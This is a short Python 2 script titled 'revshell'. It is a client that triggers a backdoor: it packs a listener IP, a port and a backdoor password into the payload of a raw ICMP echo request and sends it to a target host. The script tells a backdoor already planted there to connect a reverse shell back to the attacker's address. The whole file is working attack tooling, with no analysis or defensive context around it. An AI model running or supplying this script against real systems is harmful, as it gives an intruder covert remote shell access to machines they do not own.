#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, time, string, argparse
ICMP_ECHO_REQUEST = 8
parser = argparse.ArgumentParser(description='revshell')
parser.add_argument('host', metavar='<host>', type=str, help='remote host')
parser.add_argument('ip', metavar='<ip>', type=str, help='ip to receive reverse shell')
parser.add_argument('port', metavar='<port>', type=int, help='port to receive reverse shell')
parser.add_argument('password', metavar='<password>', type=str, help = 'backdoor\'s password')
args = parser.parse_args()

def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def sendPacket(my_socket, dest_addr, ID, ip, port, password):
    dest_addr  =  socket.gethostbyname(dest_addr)
    my_checksum = 0

    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)

    aip = ip.split('.')

    #packing arguments into packet following the format that the backdoor is expecting
    data = struct.pack("HHHHi16s", int(aip[0]), int(aip[1]), int(aip[2]), int(aip[3]), port, password)

    my_checksum = checksum(header + data)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1)

    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))

def requestAccess(dest_addr, ip, port, password):
    icmp = socket.getprotobyname("icmp")
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error, (errno, msg):
        if errno == 1:
            msg = msg + ( ": You have to be root.")
            raise socket.error(msg)
        raise
    my_ID = os.getpid() & 0xFFFF
    sendPacket(my_socket, dest_addr, my_ID, ip, port, password)
    my_socket.close()

def main(host, ip, port, password):
    try:
        delay = requestAccess(host, ip, port, password)
    except socket.gaierror, e:
        print e

if __name__ == '__main__':
    host = args.host
    ip = args.ip
    port = args.port
    password = args.password
    main(host, ip, port, password)
